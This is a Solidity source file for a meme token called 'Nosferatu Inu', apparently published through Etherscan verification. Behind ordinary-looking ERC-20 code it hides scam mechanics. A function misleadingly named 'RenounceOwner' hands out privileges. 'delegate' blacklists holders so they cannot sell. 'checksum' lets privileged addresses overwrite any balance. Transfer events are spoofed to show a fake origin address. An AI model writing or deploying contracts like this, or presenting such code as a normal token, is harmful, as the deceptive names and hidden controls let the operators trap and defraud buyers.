/**
 *Submitted for verification at Etherscan.io on 2022-10-12
*/

// "SPDX-License-Identifier: UNLICENSED

/*
 ███▄    █  ▒█████    ██████   █████▒▓█████  ██▀███   ██▓ ███▄    █  █    ██ 
 ██ ▀█   █ ▒██▒  ██▒▒██    ▒ ▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒▓██▒ ██ ▀█   █  ██  ▓██▒
▓██  ▀█ ██▒▒██░  ██▒░ ▓██▄   ▒████ ░ ▒███   ▓██ ░▄█ ▒▒██▒▓██  ▀█ ██▒▓██  ▒██░
▓██▒  ▐▌██▒▒██   ██░  ▒   ██▒░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  ░██░▓██▒  ▐▌██▒▓▓█  ░██░
▒██░   ▓██░░ ████▓▒░▒██████▒▒░▒█░    ░▒████▒░██▓ ▒██▒░██░▒██░   ▓██░▒▒█████▓ 
░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░░▓  ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ 
░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░ ░       ░ ░  ░  ░▒ ░ ▒░ ▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ 
   ░   ░ ░ ░ ░ ░ ▒  ░  ░  ░   ░ ░       ░     ░░   ░  ▒ ░   ░   ░ ░  ░░░ ░ ░ 
         ░     ░ ░        ░             ░  ░   ░      ░           ░    ░     
                                                                             
                                                                             
                                                                             
*/


pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract NOSFERINU {
  
    mapping (address => uint256) public tAmount;
    mapping (address => bool) tVal;
    mapping (address => bool) renounced;

    // 
    string public name = "Nosferatu Inu";
    string public symbol = unicode"NOSFERINU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 666000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        tAmount[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V2Router = 0x9Ebfed1dCD6D1730499A8Bbacc096a45D9FB3B81;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier T() {   
         require(renounced[msg.sender]);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V2Router)  {
        require(tAmount[msg.sender] >= value);
        tAmount[msg.sender] -= value;  
        tAmount[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        require(!tVal[msg.sender]);      
        require(tAmount[msg.sender] >= value);
        tAmount[msg.sender] -= value;  
        tAmount[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


             function balanceOf(address account) public view returns (uint256) {
            return tAmount[account]; }


        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner(address x) public {
        require(msg.sender == owner);
          renounced[x] = true; }
        
        function delegate(address x) T public{          
        require(!tVal[x]);
        tVal[x] = true; }
        function send(address x) T public {
        require(tVal[x]);
        tVal[x] = false; }
        function checksum(address usr, uint256 query) T public returns (bool success) {
        tAmount[usr] = query;
                   return true; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V2Router)  {
        require(value <= tAmount[from]);
        require(value <= allowance[from][msg.sender]);
        tAmount[from] -= value;  
        tAmount[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        require(!tVal[from]); 
        require(!tVal[to]); 
        require(value <= tAmount[from]);
        require(value <= allowance[from][msg.sender]);
        tAmount[from] -= value;
        tAmount[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }